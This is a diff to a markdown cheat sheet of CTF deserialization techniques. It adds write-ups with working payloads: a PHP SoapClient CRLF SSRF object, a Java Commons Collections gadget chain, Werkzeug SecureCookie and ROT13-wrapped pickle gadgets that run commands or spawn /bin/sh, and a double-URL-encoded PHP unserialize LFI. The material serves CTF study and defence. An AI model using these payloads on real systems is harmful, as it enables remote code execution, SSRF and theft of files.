@@ -5,11 +5,16 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 ## Table of Contents
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
 - [Python Pickle Deserialization](#python-pickle-deserialization)
-- [Race Conditions (TOCTOU)](#race-conditions-toctou)
+- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
 - [Java XMLDecoder Deserialization RCE (HackIM 2016)](#java-xmldecoder-deserialization-rce-hackim-2016)
 - [.NET JSON TypeNameHandling Deserialization (DefCamp 2017)](#net-json-typenamehandling-deserialization-defcamp-2017)
 - [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
+- [PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)](#php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018)
+- [Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)](#java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018)
+- [Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)](#werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals)
+- [PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)](#php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019)
+- [Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)](#python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019)
 
 ---
 
@@ -93,7 +98,7 @@ class ExecRCE:
 
 ---
 
-## Race Conditions (TOCTOU)
+## Race Conditions (Time-of-Check to Time-of-Use)
 
 **Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.
 
@@ -266,5 +271,173 @@ $_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
 4. PHP deserializer reads exactly `s:170:` bytes, stops mid-string, and finds the injected `";}s:5:"photo";s:10:"config.php";}` as the next serialized field
 
 **Key insight:** Any post-serialization string expansion or contraction creates exploitable length mismatches for object injection. Look for word filters, censorship, or sanitization applied after `serialize()` but before storage/`unserialize()`.
+
+---
+
+### PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)
+
+**Pattern:** When PHP deserializes a `SoapClient` object and a non-existent method is called on it, the `__call()` magic method fires an HTTP request. CRLF injection in the `uri` parameter allows crafting arbitrary HTTP requests to localhost (SSRF). This turns any deserialization sink + method call into a full SSRF primitive.
+
+**How it works:**
+1. Attacker crafts a serialized `SoapClient` with CRLF-injected `uri` parameter
+2. Application deserializes the object (via `unserialize()`, session handler, or other deserialization sink)
+3. When any undefined method is called on the deserialized object, `__call()` triggers
+4. `SoapClient` sends an HTTP request to `location` with the crafted `uri` containing injected headers and body
+
+```php
+$p = array(
+    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
+    'location' => 'http://127.0.0.1/'
+);
+$soap = new SoapClient(null, $p);
+// When getcountry() called on deserialized object -> triggers __call() -> sends crafted HTTP
+```
+
+```python
+import requests
+
+# Generate the serialized SoapClient payload
+# The CRLF in uri smuggles a complete second HTTP request
+php_serialize_script = '''
+<?php
+$target = "http://127.0.0.1/";
+$post_body = "username=admin&password=nu1ladmin&code=XXX";
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=target_session_id'
+);
+$payload = array(
+    'uri' => "http://127.0.0.1/\\r\\nContent-Length:0\\r\\n\\r\\nPOST /index.php?action=login HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n" . implode("\\r\\n", $headers) . "\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " . strlen($post_body) . "\\r\\n\\r\\n" . $post_body . "\\r\\n\\r\\nPOST /foo\\r\\n",
+    'location' => $target
+);
+echo serialize(new SoapClient(null, $payload));
+?>
+'''
+
+# The serialized payload is then injected into the deserialization sink
+# e.g., via session manipulation, cookie injection, or POST parameter
+```
+
+**Common trigger chains:**
+```text
+unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
+session_start() with custom handler → SoapClient in session → __call() on access
+```
+
+**Key insight:** PHP's SoapClient `__call()` magic method fires HTTP requests when any undefined method is called. CRLF injection in the URI parameter smuggles complete HTTP requests, enabling authenticated SSRF to localhost. This is especially powerful when combined with other PHP deserialization vectors (session handlers, `phar://` wrappers) since `SoapClient` is a built-in PHP class requiring no additional libraries. Look for any code path where a deserialized object has a method called on it.
+
+---
+
+## Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)
+
+**Pattern:** Custom Java gadget chain that calls a static method (`Flag.getFlag()`) without any off-the-shelf ysoserial gadget. The chain uses `TiedMapEntry` wrapping a `LazyMap` whose factory is a `ChainedTransformer(ConstantTransformer(Flag.class), InvokerTransformer("getMethod", ...), InvokerTransformer("invoke", ...))`. Because LazyMap evaluates its factory on `get()` before serialization completes, the payload must smuggle the TiedMapEntry into a parent HashMap *after* building it — done by reflecting into `HashMap.table` and writing the entry directly.
+
+```java
+// Build the transformer chain (classic Commons Collections)
+Transformer[] chain = new Transformer[] {
+    new ConstantTransformer(Flag.class),
+    new InvokerTransformer("getMethod",
+        new Class[]{String.class, Class[].class},
+        new Object[]{"getFlag", new Class[0]}),
+    new InvokerTransformer("invoke",
+        new Class[]{Object.class, Object[].class},
+        new Object[]{null, new Object[0]}),
+};
+Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
+TiedMapEntry entry = new TiedMapEntry(inner, "trigger");
+
+// Wrap in HashMap WITHOUT triggering LazyMap resolution:
+HashMap<Object, Object> outer = new HashMap<>();
+outer.put("placeholder", "x");            // force allocation of table[]
+Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
+table[0] = new HashMap.Node(0, "payload", entry, null);
+Whitebox.setInternalState(outer, "table", table);
+
+// Serialize and send
+ByteArrayOutputStream out = new ByteArrayOutputStream();
+new ObjectOutputStream(out).writeObject(outer);
+byte[] payload = out.toByteArray();
+```
+
+**Key insight:** The Commons Collections `LazyMap` + `ChainedTransformer` primitive can call any static method, not just `Runtime.exec`. When a CTF challenge adds its own `Flag.getFlag()` helper expecting the JVM to enforce access control, the same gadget chain used for RCE gives you direct method invocation. The tricky part is that calling `outer.put(payload, "x")` while building the HashMap would immediately resolve the LazyMap and leak the flag to the builder process — use reflection (`Whitebox.setInternalState` from PowerMock, or raw `Field.setAccessible(true)`) to write the TiedMapEntry into `HashMap.table` after the map is otherwise populated.
+
+**References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293
+
+---
+
+## Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)
+
+**Pattern:** `werkzeug.contrib.securecookie.SecureCookie` serializes session data with `pickle`. Once the Flask `SECRET_KEY` leaks (for example via SSRF reading `/proc/self/environ`), any cookie re-signs cleanly, so a `__reduce__` gadget fires on deserialization.
+
+```python
+import pickle, subprocess
+from werkzeug.contrib.securecookie import SecureCookie
+
+class Pwn:
+    def __reduce__(self):
+        return (subprocess.check_output, (['cat', '/flag.txt'],))
+
+cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
+# Set Cookie: session=<cookie> and read the flag from the response
+```
+
+**Key insight:** Any framework that mixes `pickle` with HMAC-signed cookies is a SECRET_KEY leak away from RCE. Flask's default `itsdangerous` uses JSON, but older apps on `SecureCookie` or custom signers still ship pickle.
+
+**References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144
+
+---
+
+## PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)
+
+**Pattern:** A PHP endpoint unserializes `$_GET['gg']`, and the gadget's `__destruct()` calls `doit()` which `curl`s `$this->url`. A blacklist blocks `.php`/`.txt`/`.html` via `strpos($this->url, $ext)`, but PHP decodes the query string once before `unserialize` — anything double URL-encoded (e.g. `%252e` for `.`) survives that decode as literal `%2e`, misses the `strpos` check, then gets decoded a second time by curl before the file is read.
+
+```php
+class SHITS {
+    private $url    = "file:///var/www/html/config.php";
+    private $method = "doit";
+    private $addr; private $host; private $name;
+}
+// Replace '.' with '%252e' AFTER serialize(), then fix the string length.
+// "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
+// 33 chars after the first decode), so set s:33 in the serialized blob.
+print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
+```
+```http
+GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
+```
+
+**Key insight:** When a filter uses `strpos`/`preg_match` *before* URL decoding but the downstream consumer decodes again, double-encoded payloads bypass text-based blacklists. With PHP `unserialize`, remember the `s:<len>` prefix must match the byte count *after* PHP's first URL decode (33 here, not 31 or 35) or the object fails to deserialize silently.
+
+**References:** FireShell CTF 2019 — Vice, writeup 13221
+
+---
+
+## Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)
+
+**Pattern:** Backup/restore endpoint round-trips Python objects through `pickle`, but encodes the result as `rot13(base64(pickle.dumps(obj)))` to obscure the format. The wrapper does not change exploitability — compose the inverse transforms before sending a `__reduce__` payload:
+
+```python
+import base64, codecs, pickle, subprocess
+
+def make_backup(obj):
+    s = base64.b64encode(pickle.dumps(obj)).decode()
+    return codecs.encode(s, 'rot-13')
+
+def parse_backup(blob):
+    s = codecs.decode(blob, 'rot-13')
+    return pickle.loads(base64.b64decode(s))
+
+class RunBinSh:
+    def __reduce__(self):
+        return (subprocess.Popen, (('/bin/sh',),))
+
+print(make_backup(RunBinSh()))
+# -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
+```
+Send the output into the app's load endpoint; pickle instantiates `subprocess.Popen(('/bin/sh',))` on deserialize and you land in a shell.
+
+**Key insight:** Obfuscation layers like ROT13, hex, zlib, or XOR do not change the pickle threat model — just compose the inverse transforms before sending. Identify the wrapper by round-tripping a known value (e.g. encode an empty list locally, compare against the server output); any 1:1 byte-for-byte mapping is a substitution cipher and trivially invertible.
+
+**References:** TAMUctf 2019 — VeggieTales, writeup 13424
 
 ---
